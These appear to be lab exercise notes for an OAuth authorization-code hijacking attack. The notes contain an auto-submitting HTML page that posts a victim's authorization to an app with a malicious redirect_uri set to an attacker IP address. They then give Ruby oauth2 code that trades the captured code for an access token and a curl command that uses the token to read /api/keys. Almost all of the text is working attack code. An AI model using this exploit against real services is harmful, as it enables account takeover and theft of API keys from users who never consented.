# Create webpage that automatically posts authorization to an app with redirect URI = our server

bad_page.html
```
<html>
  <body onload="document.getElementById('bad_form').submit()">
    <form id="bad_form" action="http://authorization-ptl-df6521cb-4c1f1d14.libcurl.so/oauth/authorize" accept-charset="UTF-8" method="post">
      <input name="utf8" type="hidden" value=""><input type="hidden" name="authenticity_token" value="U2z+jSsOubiE+tJW1Z9Fp8ubKPz/KFhgBjupCT20OvO5BwW5Y+qhJ2+aJqYc/HbrIXyMOd3qoLrkPW8iLlcx5w==">
      <input type="hidden" name="client_id" id="client_id" value="ac9316ccee4752eba13818fb5fccdfe2c178a4869446c495fed2ec9130ada110">
      <input type="hidden" name="redirect_uri" id="redirect_uri" value="http://157.245.250.42">
      <input type="hidden" name="state" id="state">
      <input type="hidden" name="response_type" id="response_type" value="code">
      <input type="hidden" name="scope" id="scope" value="">
      <input type="hidden" name="code_challenge" id="code_challenge">
      <input type="hidden" name="code_challenge_method" id="code_challenge_method">
      <input type="submit" name="commit" value="Authorize" class="btn btn-success btn-lg btn-block" data-disable-with="Authorize">
    </form>
  </body>
</html>
```

Have victim navigate to page after being logged into resource.

bad_page.html automatically submits form to authorization server URI with a mallicious Redirect URI to our server. From here, we see the code= in HTTP headers.

Use code to generate token.

Example in RUBY
``` ruby
require 'oauth2'

callback = "[CALLBACK_URL]"
app_id = "[APPLICATION_ID]"

secret = "[SECRET]"
client = OAuth2::Client.new(app_id, secret, site: "[AUTHORIZATION_SERVER]")
client.auth_code.authorize_url(redirect_uri: callback)


code="[CODE]"
access = client.auth_code.get_token( code, redirect_uri: callback)
access.get("/api/user").parsed

puts access.token  
```

Use token to authenticate to server
```
curl -H 'Authorization: Bearer [TOKEN]' [RESOURCE_SERVER]/api/keys --dump-header -
```

